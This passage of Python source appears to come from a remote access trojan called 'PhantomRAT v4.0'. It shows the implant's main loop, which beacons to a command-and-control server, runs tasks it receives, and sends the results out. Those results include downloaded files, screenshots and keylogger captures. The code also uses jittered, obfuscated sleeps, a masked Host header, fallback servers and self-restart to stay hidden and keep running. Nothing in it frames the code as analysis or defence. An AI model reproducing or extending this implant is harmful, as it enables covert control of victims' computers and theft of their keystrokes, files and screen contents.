    ╚══════════════════════════════════════════════════╝
    """)
    
    print(f"[*] Starting PhantomRAT v4.0 Implant")
    print(f"[*] C2 Server: {C2_SERVER}")
    if C2_FALLBACKS:
        print(f"[*] C2 Fallbacks: {', '.join(C2_FALLBACKS)}")
    if C2_MASK_HOST:
        print(f"[*] Masked Host header: {C2_MASK_HOST}")
    print(f"[*] Session ID: {SESSION_ID}")
    print(f"[*] GUI Modules: {'Available' if GUI_MODULES_AVAILABLE else 'Not available'}")
    print(f"[*] Enhanced Info: {'Available' if SYSINFO_AVAILABLE else 'Not available'}")
    print("-" * 50)
    
    # Initial registration
    print(f"[*] Attempting initial beacon...")
    initial_tasks = beacon_checkin()
    
    if initial_tasks is not None:
        print(f"[+] Connected to C2 server")
        print(f"[*] Initial tasks: {len(initial_tasks)}")
    else:
        print(f"[-] Failed to connect to C2 server")
        print(f"[*] Will retry in main loop...")
    
    task_queue = []
    failed_beacons = 0
    max_failed_beacons = 5
    
    sleep_min = max(1, min(BEACON_JITTER_MIN, BEACON_JITTER_MAX))
    sleep_max = max(sleep_min + 1, max(BEACON_JITTER_MIN, BEACON_JITTER_MAX))

    print(f"[*] Entering main loop...")
    print(f"[*] Beacon interval: {sleep_min}-{sleep_max} seconds")
    print(f"[*] Max failed beacons before backoff: {max_failed_beacons}")
    print("-" * 50)
    
    while True:
        try:
            # ========== BEACON PHASE ==========
            current_tasks = beacon_checkin()
            
            if current_tasks is None:
                failed_beacons += 1
                print(f"[!] Beacon failed ({failed_beacons}/{max_failed_beacons})")
                
                if failed_beacons >= max_failed_beacons:
                    print(f"[!] Too many failed beacons. Backing off for 5 minutes.")
                    time.sleep(300)
                    failed_beacons = 0
                    continue
            else:
                # Reset failed counter on success
                if failed_beacons > 0:
                    print(f"[+] Beacon successful after {failed_beacons} failures")
                    failed_beacons = 0
                
                # Add new tasks to queue
                if current_tasks and isinstance(current_tasks, list):
                    task_queue.extend(current_tasks)
                    print(f"[+] Received {len(current_tasks)} new tasks")
            
            # ========== TASK PROCESSING PHASE ==========
            processed_results = []
            
            while task_queue:
                task = task_queue.pop(0)
                print(f"[*] Processing task {task.get('id', 'unknown')}: {task.get('command', 'unknown')}")
                
                # Execute command
                result = handle_command_v4(task)
                processed_results.append(result)
                
                # Send result immediately for important commands
                if task.get('command') in ['download', 'screenshot', 'keylog_stop']:
                    try:
                        exfil_data(result, task.get('id'))
                        print(f"[+] Sent immediate result for task {task.get('id', 'unknown')}")
                    except Exception as e:
                        print(f"[!] Failed to send immediate result: {e}")
                
                # Small delay between tasks
                time.sleep(random.uniform(0.5, 2.0))
            
            # ========== RESULT EXFILTRATION PHASE ==========
            if processed_results:
                print(f"[*] Sending {len(processed_results)} task results to C2")
                
                # Batch results for efficiency
                batch_size = 5
                for i in range(0, len(processed_results), batch_size):
                    batch = processed_results[i:i + batch_size]
                    
                    result_payload = {
                        'type': 'task_results',
                        'implant_id': IMPLANT_ID,
                        'session_id': SESSION_ID,
                        'results': batch,
                        'timestamp': time.time()
                    }
                    
                    try:
                        exfil_response = exfil_data(result_payload)
                        if exfil_response and exfil_response.get('status') == 'success':
                            print(f"[+] Batch {i//batch_size + 1} sent successfully")
                        else:
                            print(f"[!] Failed to send batch {i//batch_size + 1}")
                    except Exception as e:
                        print(f"[!] Error sending batch: {e}")
                    
                    # Small delay between batches
                    if i + batch_size < len(processed_results):
                        time.sleep(random.uniform(1.0, 3.0))
            
            # ========== RANDOMIZED SLEEP ==========
            # Base sleep with jitter and random variance
            base_sleep = random.uniform(sleep_min, sleep_max)
            print(f"[*] Sleeping for {base_sleep:.1f} seconds")
            obfuscated_sleep(base_sleep, jitter=0.3)
            
            # ========== RANDOM SYSTEM CHECK ==========
            if random.random() < 0.2:  # 20% chance each cycle
                print(f"[*] Performing random system check")
                try:
                    # Quick system status
                    status = {
                        'cpu_percent': psutil.cpu_percent(interval=0.1),
                        'memory_percent': psutil.virtual_memory().percent,
                        'disk_free': psutil.disk_usage('/').free,
                        'timestamp': time.time()
                    }
                    
                    # Send heartbeat
                    heartbeat = {
                        'type': 'heartbeat',
                        'implant_id': IMPLANT_ID,
                        'status': 'active',
                        'system_status': status,
                        'session_id': SESSION_ID,
                        'timestamp': time.time()
                    }
                    
                    exfil_data(heartbeat)
                except Exception as e:
                    print(f"[!] System check error: {e}")
            
        except KeyboardInterrupt:
            print(f"\n[*] Interrupted by user")
            break
            
        except Exception as e:
            print(f"[!] Main loop error: {e}")
            import traceback
            traceback.print_exc()
            print(f"[*] Recovering in 60 seconds...")
            time.sleep(60)

# ==================== TEST MODE ====================
def test_mode():
    """Test mode for debugging"""
    print(f"[*] Running in TEST mode")
    
    # Test system info
    print(f"\n[*] Testing system info...")
    info = get_comprehensive_system_info()
    print(f"[+] System info collected:")
    print(f"    Hostname: {info.get('hostname')}")
    print(f"    OS: {info.get('os')} {info.get('os_version')}")
    print(f"    IP: {info.get('ip')}")
    print(f"    Memory: {info.get('memory_total_gb')}GB total")
    
    # Test encryption
    print(f"\n[*] Testing encryption...")
    test_data = {'test': 'data', 'timestamp': time.time()}
    encrypted = encryption.encrypt(test_data)
    decrypted = encryption.decrypt(encrypted)
    print(f"[+] Encryption test: {'PASS' if decrypted and decrypted.get('test') == 'data' else 'FAIL'}")
    
    # Test command execution
    print(f"\n[*] Testing command execution...")
    test_commands = [
        {'command': 'ping', 'arguments': ''},
        {'command': 'get_id', 'arguments': ''},
        {'command': 'ls', 'arguments': '.'}
    ]
    
    for cmd in test_commands:
        print(f"\n[*] Testing: {cmd['command']}")
        result = handle_command_v4(cmd)
        print(f"    Success: {result['success']}")
        if result['output']:
            output_preview = str(result['output'])[:100]
            print(f"    Output: {output_preview}...")
    
    print(f"\n[*] Test complete")

# ==================== ENTRY POINT ====================
def main():
    """Main entry point"""
    import sys
    
    # Parse arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "--test":
            test_mode()
            return
        elif sys.argv[1] == "--help":
            print(f"""
PhantomRAT Implant v4.0
Usage: python3 main.py [OPTIONS]

Options:
  --test     Run in test mode (no C2 communication)
  --help     Show this help message
  --once     Run one beacon cycle and exit
  --id       Show implant ID and exit

Examples:
  python3 main.py --test
  python3 main.py
            """)
            return
        elif sys.argv[1] == "--once":
            print(f"[*] Running single beacon cycle")
            tasks = beacon_checkin()
            print(f"[*] Received {len(tasks) if tasks else 0} tasks")
            if tasks:
                for task in tasks:
                    result = handle_command_v4(task)
                    print(f"[*] Task {task.get('id')}: {result['success']}")
            return
        elif sys.argv[1] == "--id":
            # Generate ID without beaconing
            host_hash = hashlib.sha256(socket.gethostname().encode()).hexdigest()[:12]
            implant_id = f"PHANTOM-{host_hash.upper()}"
            print(f"Implant ID: {implant_id}")
            print(f"Session ID: {SESSION_ID}")
            print(f"Hostname: {socket.gethostname()}")
            return
    
    # Check dependencies
    required_modules = ['requests', 'cryptography', 'psutil']
    missing_modules = []
    
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        print(f"[!] Missing required modules: {', '.join(missing_modules)}")
        print(f"[*] Install with: pip install {' '.join(missing_modules)}")
        sys.exit(1)
    
    # Start main loop
    try:
        main_loop()
    except KeyboardInterrupt:
        print(f"\n[*] Shutdown requested")
        print(f"[*] Cleaning up...")
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        print(f"[*] Attempting to restart in 30 seconds...")
        time.sleep(30)
        main()

if __name__ == "__main__":
    main()
